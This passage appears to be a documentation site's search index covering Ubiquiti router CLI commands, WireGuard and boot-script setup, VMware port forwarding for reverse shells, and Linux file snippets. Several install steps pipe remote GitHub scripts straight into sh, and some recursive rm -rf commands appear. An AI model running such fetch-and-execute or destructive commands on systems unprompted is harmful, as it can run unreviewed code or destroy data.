and IPv6 neighbours arp -a OR ip neigh show tunnel interfaces ip tunnel show Show Sensors information sensors Open shell to unifi podman container unifi-os shell tcpdump tcpdump -w", "title": "CLI Commands"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/cli-commands/#udm-cli-commands-list", "text": "Collection of CLI commands for the Ubiquiti Unifi Dream Machine or Dream Machine Pro.", "title": "UDM CLI Commands List"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/cli-commands/#common-udm-commands", "text": "Open shell to unifi podman container (udm pro) unifi-os shell Show Sensors information including: UDM temperature, fan speed, and voltage. sensors Show ARP Table arp -a Display All Listening Ports on the UDM Device netstat -plant", "title": "Common UDM Commands"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/cli-commands/#udm-commands-list", "text": "Collection of commands for your Unifi Dream Machine or Dream Machine Pro. Description UDM/UDM-P SSH Command show DHCP leases (to NSname) cat /mnt/data/udapi-config/dnsmasq.lease show version info show system hardware and installed software ubnt-device-info summary show cpu tempeture ubnt-systool cputemp show fan speed ubnt-fan-speed show uptime uptime show ip route netstat -rt -n show ppp summery pppstats show current user whoami show log cat /var/log/messages show interface summary ifstat show interfaces ifconfig show other Ubiquiti devices on local LAN segment (ubnt-discovery) ubnt-tools ubnt-discover show config (wireless) cat /mnt/data/udapi-config/unifi packet capture tcpdump shutdown poweroff reload reboot show ipsec sa ipsec statusall factory reset factory-reset.sh show system burnt in MAC address ubnt-tools hwaddr show unifi server logs cat /mnt/data/unifi-os/unifi/logs/server.log show unifi server setttings cat /mnt/data/unifi-os/unifi-core/config/settings.yaml show unifi server http logs cat /mnt/data/unifi-os/unifi-core/logs/http.log show unifi server http logs (errors) cat /mnt/data/unifi-os/unifi-core/logs/errors.log show unifi server discovery log cat /mnt/data/unifi-os/unifi-core/logs/discovery.log show unifi system logs cat /mnt/data/unifi-os/unifi-core/logs/system.log Restarts the UnifiOS Web interface /etc/init.d/S95unifios restart show ip arp (show arp) and IPv6 neighbours arp -a OR ip neigh show tunnel interfaces ip tunnel show Show Sensors information sensors Open shell to unifi podman container unifi-os shell tcpdump tcpdump -w", "title": "UDM Commands List"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/", "tags": ["udm", "ubiquiti", "unifi"], "text": "UDM WAN Failover Telegram Notifications \u00b6 This script will send a message to a Telegram chat when WAN connection is changed to failover and back to normal. Github Repository: UDM Failover Telegram Notifications Persistence on Reboot \u00b6 This script need to run every time the system is rebooted since the UDM overwrites crons every boot. This can be accomplished with a boot script. Flow this guide: UDM / UDMPro Boot Script Compatibility \u00b6 Tested on UDM PRO Installation \u00b6 curl https://raw.githubusercontent.com/fire1ce/UDM-Failover-Telegram-Notifications/main/install.sh | sh Set your Telegram Chat ID and Bot API Key at /mnt/data/UDMP-Failover-Telegram-Notifications/failover-notifications.sh Config \u00b6 Parameters Description telegram_bot_API_Token Telegram Bot API Token telegram_chat_id Chat ID of the Telegram Bot echo_server_ip IP of a server to test what interface is active (Default 1.1.1.1) run_interval Interval to run a failover check (Default 60 seconds) Uninstall \u00b6 Delete the UDMP-Failover-Telegram-Notifications folder rm -rf /mnt/data/UDMP-Failover-Telegram-Notifications Delete on boot script file rm -rf /mnt/data/on_boot.d/99-failover-telegram-notifications.sh Usage \u00b6 At boot the script with create a cronjob that will run once. This is done to prevent boot blocking. Manual run to test notifications: /mnt/data/UDMP-Failover-Telegram-Notifications/failover-notifications.sh It's strongly recommended to perform a reboot in order to check the on boot initialization of the notifications", "title": "Failover Telegram Notifications"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#udm-wan-failover-telegram-notifications", "text": "This script will send a message to a Telegram chat when WAN connection is changed to failover and back to normal. Github Repository: UDM Failover Telegram Notifications", "title": "UDM WAN Failover Telegram Notifications"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#persistence-on-reboot", "text": "This script need to run every time the system is rebooted since the UDM overwrites crons every boot. This can be accomplished with a boot script. Flow this guide: UDM / UDMPro Boot Script", "title": "Persistence on Reboot"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#compatibility", "text": "Tested on UDM PRO", "title": "Compatibility"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#installation", "text": "curl https://raw.githubusercontent.com/fire1ce/UDM-Failover-Telegram-Notifications/main/install.sh | sh Set your Telegram Chat ID and Bot API Key at /mnt/data/UDMP-Failover-Telegram-Notifications/failover-notifications.sh", "title": "Installation"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#config", "text": "Parameters Description telegram_bot_API_Token Telegram Bot API Token telegram_chat_id Chat ID of the Telegram Bot echo_server_ip IP of a server to test what interface is active (Default 1.1.1.1) run_interval Interval to run a failover check (Default 60 seconds)", "title": "Config"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#uninstall", "text": "Delete the UDMP-Failover-Telegram-Notifications folder rm -rf /mnt/data/UDMP-Failover-Telegram-Notifications Delete on boot script file rm -rf /mnt/data/on_boot.d/99-failover-telegram-notifications.sh", "title": "Uninstall"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#usage", "text": "At boot the script with create a cronjob that will run once. This is done to prevent boot blocking. Manual run to test notifications: /mnt/data/UDMP-Failover-Telegram-Notifications/failover-notifications.sh It's strongly recommended to perform a reboot in order to check the on boot initialization of the notifications", "title": "Usage"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-boot-script/", "tags": ["udm", "ubiquiti", "unifi"], "text": "Persistent On Boot Script \u00b6 When UDM or UDM PRO reboots or the firmawre is updated the custom changes you made will be lost. This Script will allow you to initialize your custom changes on every boot or firmware update. without losing your custom changes. Github Repository: unifios-utilities - on-boot-script Features \u00b6 Allows you to run a shell script at S95 anytime your UDM starts / reboots Persists through reboot and firmware updates ! It is able to do this because Ubiquiti caches all debian package installs on the UDM in /mnt/data, then re-installs them on reset of unifi-os container. Install \u00b6 You can execute in UDM/Pro/SE and UDR with: curl -fsL \"https://raw.githubusercontent.com/unifi-utilities/unifios-utilities/HEAD/on-boot-script/remote_install.sh\" | /bin/sh This is a force to install script so will uninstall any previous version and install on_boot keeping your on boot files. This will also install CNI Plugins & CNI Bridge scripts. If you are using UDMSE/UDR remember that you must install podman manually because there is no podman. For manual installation see: The Github Readme", "title": "Persistent Boot Script"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-boot-script/#persistent-on-boot-script", "text": "When UDM or UDM PRO reboots or the firmawre is updated the custom changes you made will be lost. This Script will allow you to initialize your custom changes on every boot or firmware update. without losing your custom changes. Github Repository: unifios-utilities - on-boot-script", "title": "Persistent On Boot Script"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-boot-script/#features", "text": "Allows you to run a shell script at S95 anytime your UDM starts / reboots Persists through reboot and firmware updates ! It is able to do this because Ubiquiti caches all debian package installs on the UDM in /mnt/data, then re-installs them on reset of unifi-os container.", "title": "Features"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-boot-script/#install", "text": "You can execute in UDM/Pro/SE and UDR with: curl -fsL \"https://raw.githubusercontent.com/unifi-utilities/unifios-utilities/HEAD/on-boot-script/remote_install.sh\" | /bin/sh This is a force to install script so will uninstall any previous version and install on_boot keeping your on boot files. This will also install CNI Plugins & CNI Bridge scripts. If you are using UDMSE/UDR remember that you must install podman manually because there is no podman. For manual installation see: The Github Readme", "title": "Install"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/", "tags": ["udm", "ubiquiti", "unifi"], "text": "UDM Persistent SSH Keys \u00b6 UDM will discard any Authorized Keys for SSH every reboot or firmware upgrade. This script will allow you to persist your SSH keys in the UDM and survive reboots. Github Repository: UDM Persistent SSH Keys Persistence on Reboot \u00b6 This script need to run every time the system is rebooted since the /root/.ssh/authorized_keys overwrites every boot. This can be accomplished with a boot script. Flow this guide: UDM / UDMPro Boot Script Compatibility \u00b6 Tested on UDM PRO UDM Pro doesn't support ed25519 SSH Keys Installation \u00b6 The script was tested on UDM PRO curl https://raw.githubusercontent.com/fire1ce/UDM-Persistent-SSH-Keys/main/install.sh | sh Add you public RSA keys to: /mnt/data/ssh/authorized_keys Uninstall \u00b6 Delete the 99-ssh-keys.sh file rm -rf /mnt/data/on_boot.d/99-ssh-keys.sh Delete your authorized_keys file rm -rf /mnt/data/ssh/authorized_keys Usage \u00b6 At boot the script with read the /mnt/data/ssh/authorized_keys file and add the content to UDM's /root/.ssh/authorized_keys Manual run: /mnt/data/on_boot.d/99-ssh-keys.sh", "title": "Persistent SSH Keys"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#udm-persistent-ssh-keys", "text": "UDM will discard any Authorized Keys for SSH every reboot or firmware upgrade. This script will allow you to persist your SSH keys in the UDM and survive reboots. Github Repository: UDM Persistent SSH Keys", "title": "UDM Persistent SSH Keys"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#persistence-on-reboot", "text": "This script need to run every time the system is rebooted since the /root/.ssh/authorized_keys overwrites every boot. This can be accomplished with a boot script. Flow this guide: UDM / UDMPro Boot Script", "title": "Persistence on Reboot"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#compatibility", "text": "Tested on UDM PRO UDM Pro doesn't support ed25519 SSH Keys", "title": "Compatibility"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#installation", "text": "The script was tested on UDM PRO curl https://raw.githubusercontent.com/fire1ce/UDM-Persistent-SSH-Keys/main/install.sh | sh Add you public RSA keys to: /mnt/data/ssh/authorized_keys", "title": "Installation"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#uninstall", "text": "Delete the 99-ssh-keys.sh file rm -rf /mnt/data/on_boot.d/99-ssh-keys.sh Delete your authorized_keys file rm -rf /mnt/data/ssh/authorized_keys", "title": "Uninstall"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#usage", "text": "At boot the script with read the /mnt/data/ssh/authorized_keys file and add the content to UDM's /root/.ssh/authorized_keys Manual run: /mnt/data/on_boot.d/99-ssh-keys.sh", "title": "Usage"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/", "tags": ["udm", "ubiquiti", "unifi", "wireguard"], "text": "Wireguard VPN \u00b6 WireGuard\u00ae is an extremely simple yet fast and modern VPN that utilizes state-of-the-art cryptography. It aims to be faster, simpler, leaner, and more useful than IPsec, while avoiding the massive headache. It intends to be considerably more performant than OpenVPN. WireGuard is designed as a general purpose VPN for running on embedded interfaces and super computers alike, fit for many different circumstances. Initially released for the Linux kernel, it is now cross-platform (Windows, macOS, BSD, iOS, Android) and widely deployable. It is currently under heavy development, but already it might be regarded as the most secure, easiest to use, and simplest VPN solution in the industry. Github Repository: wireguard-vyatta-ubnt A guide on installing and using the WireGuard kernel module and tools on Ubiquiti UnifiOS routers (UDM, UDR, and UXG). Installation \u00b6 Download the latest release for UnifiOS. Use the correct link in the command below curl -Lfo UnifiOS-wireguard.tar.gz https://github.com/WireGuard/wireguard-vyatta-ubnt/releases/download/ ${ RELEASE } /UnifiOS- ${ RELEASE } .tar.gz Extract the files to your data directory and run the setup script. For the UDM/P or UXG-Pro, extract the files into /mnt/data/wireguard tar -C /mnt/data -xvf UnifiOS-wireguard.tar.gz /mnt/data/wireguard/setup_wireguard.sh For the UDM-SE or UDR, extract the files into /data/wireguard tar -C /data -xvf UnifiOS-wireguard.tar.gz /data/wireguard/setup_wireguard.sh The setup script will load the wireguard module, and setup the symbolic links for the wireguard tools (wg-quick and wg). You can run dmesg to verify the kernel module was loaded. You should see something like the following: [ 13540 .520120 ] wireguard: WireGuard 1 .0.20210219 loaded. See www.wireguard.com for information. [ 13540 .520126 ] wireguard: Copyright ( C ) 2015 -2019 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved. Now you should be able to create a wireguard interface. Please see usage below. Compatibility \u00b6 The wireguard module and tools included in this package have been tested on the following Ubiquiti devices: Unifi Dream Machine (UDM) and UDM-Pro 0.5.x, 1.9.x, 1.10.x, 1.11.x. UDM-SE and Unifi Dream Router (UDR) 2.2.x UniFi Next-Gen Gateway (UXG-Pro) 1.11.x Note that for the UDM, UDM Pro, and UXG-Pro, Ubiquiti includes the wireguard module in the official kernel since firmware 1.11.0-14, but doesn't include the WireGuard tools. The setup script in this package will try to load the built-in wireguard module if it exists first. Upgrade \u00b6 Unload the wireguard module. rmmod wireguard Re-install wireguard by following the Installation instructions above to get the latest version. Uninstallation \u00b6 Delete the wireguard files from your data directory. rm -rf /mnt/data/wireguard Delete the wireguard tools and any boot scripts. rm /usr/bin/wg /usr/bin/wg-quick Usage \u00b6 Read the documentation on WireGuard.com for general WireGuard concepts. Here is a simple example of a wireguard server configuration for UnifiOS. Create the server and client public/private key pairs by running the following. This will create the files privatekey_server , publickey_server and privatekey_client1 , publickey_client1 . These contain the public and private keys. Store these files somewhere safe. wg genkey | tee privatekey_server | wg pubkey > publickey_server wg genkey | tee privatekey_client1 | wg pubkey > publickey_client1 On your UDM/UDR, create a wireguard config under /etc/wireguard named wg0.conf . Here is an example server config. Remember to use the correct server private key and the client public key . [Interface] Address = 10.0.2.1/24 PrivateKey = <server's privatekey> ListenPort = 51820 [Peer] PublicKey = <client's publickey> AllowedIPs = 10.0.2.2/32 For your client, you will need a client config like the following example. Remember to use the correct client private key and the server public key . [Interface] Address = 10.0.2.2/32 PrivateKey = <client's privatekey> [Peer] PublicKey = <server's publickey> Endpoint = <server's ip>:51820 AllowedIPs = 10.0.2.0/24 Adjust Address to change the IP of the client. Adjust AllowedIPs to set what your client should route through the tunnel. Set to 0.0.0.0/0,::/0 to route all the client's Internet through the tunnel. See the WireGuard documentation for more information. Note each different client requires their own private/public key pair, and the public key must be added to the server's WireGuard config as a separate Peer. To bring the tunnel up, run wg-quick up <config> . Verify the tunnel received a handshake by running wg . wg-quick up /etc/wireguard/wg0.conf To bring down the tunnel, run wg-quick down <config> . wg-quick down /etc/wireguard/wg0.conf In your UniFi Network settings, add a WAN_LOCAL (or Internet Local) firewall rule to ACCEPT traffic destined to UDP port 51820 (or your ListenPort if different). Opening this port in the firewall is needed so remote clients can access the WireGuard server. Routing \u00b6 The AllowedIPs parameter in the wireguard config allows you to specify which destination subnets to route through the tunnel. If you want to route router-connected clients through the wireguard tunnel based on source subnet or source VLAN, you need to set up policy-based routing. Currently, there is no GUI support for policy-based routing in UnifiOS, but it can be set up in SSH by using ip route to create a custom routing table, and ip rule to select which clients to route through the custom table. For a script that makes it easy to set-up policy-based routing rules on UnifiOS, see the split-vpn project. Binaries \u00b6 Prebuilt binaries are available under releases . The binaries are statically linked against musl libc to mitigate potential issues with UnifiOS' glibc. Persistence on Reboot \u00b6 The setup script must be run every time the system is rebooted to link the wireguard tools and load the module. This can be accomplished with a boot script. For the UDM or UDM Pro, install UDM Utilities on-boot-script by following the instructions here , then create a boot script under /mnt/data/on_boot.d/99-setup-wireguard.sh and fill it with the following contents. Remember to run chmod +x /mnt/data/on_boot.d/99-setup-wireguard.sh afterwards. Click here to see the boot script. #!/bin/sh /mnt/data/wireguard/setup_wireguard.sh For the UDM-SE or UDR, create a systemd boot service to run the setup script at boot. Create a service file under /etc/systemd/system/setup-wireguard.service and fill it with the following contents. After creating the service, run systemctl daemon-reload && systemctl enable setup-wireguard to enable the service on boot. Click here to see the boot service. [Unit] Description = Run wireguard setup script Wants = network.target After = network.target [Service] Type = oneshot ExecStart = sh -c 'WGDIR=\"$(find /mnt/data/wireguard /data/wireguard -maxdepth 1 -type d -name \"wireguard\" 2>/dev/null | head -n1)\"; \"$WGDIR/setup_wireguard.sh\"' [Install] WantedBy = multi-user.target Note this only adds the setup script to start at boot. If you also want to bring your wireguard interface up at boot, you will need to add another boot script with your wg-quick up command. Troubleshooting \u00b6 Setup script returns error \"Unsupported Kernel version XXX\" * The wireguard package does not contain a wireguard module built for your firmware or kernel version, nor is there a built-in module in your kernel. Please open an issue and report your version so we can try to update the module. wg-quick up returns error \"unable to initialize table 'raw'\" * Your kernel does not have the iptables raw module. The raw module is only required if you use `0.0.0.0/0` or `::/0` in your wireguard config's AllowedIPs. A workaround is to instead set AllowedIPs to `0.0.0.0/1,128.0.0.0/1` for IPv4 or `::/1,8000::/1` for IPv6. These subnets cover the same range but do not invoke wg-quick's use of the iptables raw module. Credits \u00b6 Original work to compile WireGuard on UnifiOS by @tusc ( wireguard-kmod ). \"WireGuard\" and the \"WireGuard\" logo are registered trademarks of Jason A. Donenfeld.", "title": "Wireguard VPN"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#wireguard-vpn", "text": "WireGuard\u00ae is an extremely simple yet fast and modern VPN that utilizes state-of-the-art cryptography. It aims to be faster, simpler, leaner, and more useful than IPsec, while avoiding the massive headache. It intends to be considerably more performant than OpenVPN. WireGuard is designed as a general purpose VPN for running on embedded interfaces and super computers alike, fit for many different circumstances. Initially released for the Linux kernel, it is now cross-platform (Windows, macOS, BSD, iOS, Android) and widely deployable. It is currently under heavy development, but already it might be regarded as the most secure, easiest to use, and simplest VPN solution in the industry. Github Repository: wireguard-vyatta-ubnt A guide on installing and using the WireGuard kernel module and tools on Ubiquiti UnifiOS routers (UDM, UDR, and UXG).", "title": "Wireguard VPN"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#installation", "text": "Download the latest release for UnifiOS. Use the correct link in the command below curl -Lfo UnifiOS-wireguard.tar.gz https://github.com/WireGuard/wireguard-vyatta-ubnt/releases/download/ ${ RELEASE } /UnifiOS- ${ RELEASE } .tar.gz Extract the files to your data directory and run the setup script. For the UDM/P or UXG-Pro, extract the files into /mnt/data/wireguard tar -C /mnt/data -xvf UnifiOS-wireguard.tar.gz /mnt/data/wireguard/setup_wireguard.sh For the UDM-SE or UDR, extract the files into /data/wireguard tar -C /data -xvf UnifiOS-wireguard.tar.gz /data/wireguard/setup_wireguard.sh The setup script will load the wireguard module, and setup the symbolic links for the wireguard tools (wg-quick and wg). You can run dmesg to verify the kernel module was loaded. You should see something like the following: [ 13540 .520120 ] wireguard: WireGuard 1 .0.20210219 loaded. See www.wireguard.com for information. [ 13540 .520126 ] wireguard: Copyright ( C ) 2015 -2019 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved. Now you should be able to create a wireguard interface. Please see usage below.", "title": "Installation"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#compatibility", "text": "The wireguard module and tools included in this package have been tested on the following Ubiquiti devices: Unifi Dream Machine (UDM) and UDM-Pro 0.5.x, 1.9.x, 1.10.x, 1.11.x. UDM-SE and Unifi Dream Router (UDR) 2.2.x UniFi Next-Gen Gateway (UXG-Pro) 1.11.x Note that for the UDM, UDM Pro, and UXG-Pro, Ubiquiti includes the wireguard module in the official kernel since firmware 1.11.0-14, but doesn't include the WireGuard tools. The setup script in this package will try to load the built-in wireguard module if it exists first.", "title": "Compatibility"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#upgrade", "text": "Unload the wireguard module. rmmod wireguard Re-install wireguard by following the Installation instructions above to get the latest version.", "title": "Upgrade"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#uninstallation", "text": "Delete the wireguard files from your data directory. rm -rf /mnt/data/wireguard Delete the wireguard tools and any boot scripts. rm /usr/bin/wg /usr/bin/wg-quick", "title": "Uninstallation"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#usage", "text": "Read the documentation on WireGuard.com for general WireGuard concepts. Here is a simple example of a wireguard server configuration for UnifiOS. Create the server and client public/private key pairs by running the following. This will create the files privatekey_server , publickey_server and privatekey_client1 , publickey_client1 . These contain the public and private keys. Store these files somewhere safe. wg genkey | tee privatekey_server | wg pubkey > publickey_server wg genkey | tee privatekey_client1 | wg pubkey > publickey_client1 On your UDM/UDR, create a wireguard config under /etc/wireguard named wg0.conf . Here is an example server config. Remember to use the correct server private key and the client public key . [Interface] Address = 10.0.2.1/24 PrivateKey = <server's privatekey> ListenPort = 51820 [Peer] PublicKey = <client's publickey> AllowedIPs = 10.0.2.2/32 For your client, you will need a client config like the following example. Remember to use the correct client private key and the server public key . [Interface] Address = 10.0.2.2/32 PrivateKey = <client's privatekey> [Peer] PublicKey = <server's publickey> Endpoint = <server's ip>:51820 AllowedIPs = 10.0.2.0/24 Adjust Address to change the IP of the client. Adjust AllowedIPs to set what your client should route through the tunnel. Set to 0.0.0.0/0,::/0 to route all the client's Internet through the tunnel. See the WireGuard documentation for more information. Note each different client requires their own private/public key pair, and the public key must be added to the server's WireGuard config as a separate Peer. To bring the tunnel up, run wg-quick up <config> . Verify the tunnel received a handshake by running wg . wg-quick up /etc/wireguard/wg0.conf To bring down the tunnel, run wg-quick down <config> . wg-quick down /etc/wireguard/wg0.conf In your UniFi Network settings, add a WAN_LOCAL (or Internet Local) firewall rule to ACCEPT traffic destined to UDP port 51820 (or your ListenPort if different). Opening this port in the firewall is needed so remote clients can access the WireGuard server.", "title": "Usage"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#routing", "text": "The AllowedIPs parameter in the wireguard config allows you to specify which destination subnets to route through the tunnel. If you want to route router-connected clients through the wireguard tunnel based on source subnet or source VLAN, you need to set up policy-based routing. Currently, there is no GUI support for policy-based routing in UnifiOS, but it can be set up in SSH by using ip route to create a custom routing table, and ip rule to select which clients to route through the custom table. For a script that makes it easy to set-up policy-based routing rules on UnifiOS, see the split-vpn project.", "title": "Routing"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#binaries", "text": "Prebuilt binaries are available under releases . The binaries are statically linked against musl libc to mitigate potential issues with UnifiOS' glibc.", "title": "Binaries"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#persistence-on-reboot", "text": "The setup script must be run every time the system is rebooted to link the wireguard tools and load the module. This can be accomplished with a boot script. For the UDM or UDM Pro, install UDM Utilities on-boot-script by following the instructions here , then create a boot script under /mnt/data/on_boot.d/99-setup-wireguard.sh and fill it with the following contents. Remember to run chmod +x /mnt/data/on_boot.d/99-setup-wireguard.sh afterwards. Click here to see the boot script. #!/bin/sh /mnt/data/wireguard/setup_wireguard.sh For the UDM-SE or UDR, create a systemd boot service to run the setup script at boot. Create a service file under /etc/systemd/system/setup-wireguard.service and fill it with the following contents. After creating the service, run systemctl daemon-reload && systemctl enable setup-wireguard to enable the service on boot. Click here to see the boot service. [Unit] Description = Run wireguard setup script Wants = network.target After = network.target [Service] Type = oneshot ExecStart = sh -c 'WGDIR=\"$(find /mnt/data/wireguard /data/wireguard -maxdepth 1 -type d -name \"wireguard\" 2>/dev/null | head -n1)\"; \"$WGDIR/setup_wireguard.sh\"' [Install] WantedBy = multi-user.target Note this only adds the setup script to start at boot. If you also want to bring your wireguard interface up at boot, you will need to add another boot script with your wg-quick up command.", "title": "Persistence on Reboot"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#troubleshooting", "text": "Setup script returns error \"Unsupported Kernel version XXX\" * The wireguard package does not contain a wireguard module built for your firmware or kernel version, nor is there a built-in module in your kernel. Please open an issue and report your version so we can try to update the module. wg-quick up returns error \"unable to initialize table 'raw'\" * Your kernel does not have the iptables raw module. The raw module is only required if you use `0.0.0.0/0` or `::/0` in your wireguard config's AllowedIPs. A workaround is to instead set AllowedIPs to `0.0.0.0/1,128.0.0.0/1` for IPv4 or `::/1,8000::/1` for IPv6. These subnets cover the same range but do not invoke wg-quick's use of the iptables raw module.", "title": "Troubleshooting"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#credits", "text": "Original work to compile WireGuard on UnifiOS by @tusc ( wireguard-kmod ). \"WireGuard\" and the \"WireGuard\" logo are registered trademarks of Jason A. Donenfeld.", "title": "Credits"}, {"location": "infrastructure/vmware/vmware-fusion/", "text": "VMware Fusion \u00b6 Port Forwarding for Reverse Shells \u00b6 If you use your vm as NAT network \"Shared with My Mac\" You can forward a port to your host macOS machine. The network configuration files are stored their respective folders within the VMware Fusion preferences folder. /Library/Preferences/VMware \\ Fusion/ In order to find the right network config you can inspect the dhcpd.conf inside of vmnet* folders. cat dhcpd.conf After you found the correct network it should contain a nat.conf file Edit the (with sudo privileges) nat.conf , For UDP protocol edit the section [incomingudp] for TCP protocol edit the [incomingtcp] In the next example we will forward port 4444 from VM to the 4444 port on the host. You can foreword any port to any port as you like. After you saved the configuration nat.conf file you must restart VMware's network services You do NOT need to restart the Virtual Machine sudo /Applications/VMware \\ Fusion.app/Contents/Library/vmnet-cli --stop sudo /Applications/VMware \\ Fusion.app/Contents/Library/vmnet-cli --start If you want to test the port forwarding is working as it should here's an example of running simple python webserver on the vm on port 4444 we configured before: python -m SimpleHTTPServer 4444 Now you can test it on the Host machine by browsing to http://localhost:4444 or http://127.0.0.1:4444", "title": "VMware Fusion"}, {"location": "infrastructure/vmware/vmware-fusion/#vmware-fusion", "text": "", "title": "VMware Fusion"}, {"location": "infrastructure/vmware/vmware-fusion/#port-forwarding-for-reverse-shells", "text": "If you use your vm as NAT network \"Shared with My Mac\" You can forward a port to your host macOS machine. The network configuration files are stored their respective folders within the VMware Fusion preferences folder. /Library/Preferences/VMware \\ Fusion/ In order to find the right network config you can inspect the dhcpd.conf inside of vmnet* folders. cat dhcpd.conf After you found the correct network it should contain a nat.conf file Edit the (with sudo privileges) nat.conf , For UDP protocol edit the section [incomingudp] for TCP protocol edit the [incomingtcp] In the next example we will forward port 4444 from VM to the 4444 port on the host. You can foreword any port to any port as you like. After you saved the configuration nat.conf file you must restart VMware's network services You do NOT need to restart the Virtual Machine sudo /Applications/VMware \\ Fusion.app/Contents/Library/vmnet-cli --stop sudo /Applications/VMware \\ Fusion.app/Contents/Library/vmnet-cli --start If you want to test the port forwarding is working as it should here's an example of running simple python webserver on the vm on port 4444 we configured before: python -m SimpleHTTPServer 4444 Now you can test it on the Host machine by browsing to http://localhost:4444 or http://127.0.0.1:4444", "title": "Port Forwarding for Reverse Shells"}, {"location": "linux/files-handling/", "tags": ["linux", "files-handling"], "text": "Files Handling \u00b6 NCurses Disk Usage \u00b6 Ncdu is a disk usage analyzer with an ncurses interface. apt-get install ncdu Delete Large File List - Argument list too long \u00b6 find . -name '*' | xargs rm Change permissions (chmod) to folders and files \u00b6 find . -type d -exec chmod 755 {} + find . -type f -exec chmod 644 {} + Recursively chown user and group \u00b6 chown -R user:group /some/path/here Recursively chmod to 775/664 \u00b6 chmod -R a = ,a+rX,u+w,g+w /some/path/here ^ ^ ^ ^ adds write to group | | | adds write to user | | adds read to all and execute to all folders ( which controls access ) | sets all to ` 000 ` Find UID/GID for user \u00b6 id <username>", "title": "Files Handling"}, {"location": "linux/files-handling/#files-handling", "text": "", "title": "Files Handling"}, {"location": "linux/files-handling/#ncurses-disk-usage", "text": "Ncdu is a disk usage analyzer with an ncurses interface. apt-get install ncdu", "title": "NCurses Disk Usage"}, {"location": "linux/files-handling/#delete-large-file-list-argument-list-too-long", "text": "find . -name '*' | xargs rm", "title": "Delete Large File List - Argument list too long"}, {"location": "linux/files-handling/#change-permissions-chmod-to-folders-and-files", "text": "find . -type d -exec chmod 755 {} + find . -type f -exec chmod 644 {} +", "title": "Change permissions (chmod) to folders and files"}, {"location": "linux/files-handling/#recursively-chown-user-and-group", "text": "chown -R user:group /some/path/here", "title": "Recursively chown user and group"}, {"location": "linux/files-handling/#recursively-chmod-to-775664", "text": "chmod -R a = ,a+rX,u+w,g+w /some/path/here ^ ^ ^ ^ adds write to group | | | adds write to user | | adds read to all and execute to all folders ( which controls access ) | sets all to ` 000 `", "title": "Recursively chmod to 775/664"}, {"location": "linux/files-handling/#find-uidgid-for-user", "text": "id <username>", "title": "Find UID/GID for user"}, {"location": "linux/general-snippets/", "text": "General Snippets \u00b6 Disable SSH Login Welcome Message \u00b6 To disable touch ~/.hushlogin To re-enable rm -rf ~/.hushlogin Redirect Output to a File and Stdout With tee \u00b6 The command you want is named tee : foo | tee output.file For example, if you only care about stdout: ls -a | tee output.file If you want to include stderr, do: program [ arguments... ] 2 > & 1 | tee outfile 2>&1 redirects channel 2 (stderr/standard error) into channel 1 (stdout/standard output), such that both is written as stdout. It is also directed to the given output file as of the tee command. Furthermore, if you want to append to the log file, use tee -a as: program [ arguments... ] 2 > & 1 | tee -a outfile Add Permanent Path to Application \u00b6 First find the location of the Application/Service: find / -name ApplicationName Go to the path where the application is located cd \"../../../ApplicationName\" Run this command for ZSH: echo 'export PATH=\"' $( pwd ) ':$PATH\"' >> ~/.zshrc && source ~/.zshrc Run this command for \"shell Profile\": echo 'export PATH=\"' $( pwd ) ':$PATH\"' >> ~/.profile && source ~/.profile Run this command for \"shell\": echo 'export PATH=\"' $( pwd ) ':$PATH\"' >> ~/.shellrc && source ~/.shellrc Create Symbolic Links \u00b6 To create a symbolic link in Unix/Linux, at the terminal prompt, enter: ln -s source_file target_file to remove symbolic link use the rm command on the link Open Last Edited File \u00b6 less ` ls -dx1tr /usr/local/cpanel/logs/cpbackup/* | tail -1 ` Kill Process That Runs More Than X Time \u00b6 Kill cgi after 30 secs: for i in ` ps -eo pid,etime,cmd | grep cgi | awk '$2 > \"00:30\" {print $1}' ` ; do kill $i ; done", "title": "General Snippets"}, {"location": "linux/general-snippets/#general-snippets", "text": "", "title": "General Snippets"}, {"location": "linux/general-snippets/#disable-ssh-login-welcome-message", "text": "To disable touch ~/.hushlogin To re-enable rm -rf ~/.hushlogin", "title": "Disable SSH Login Welcome Message"}, {"location": 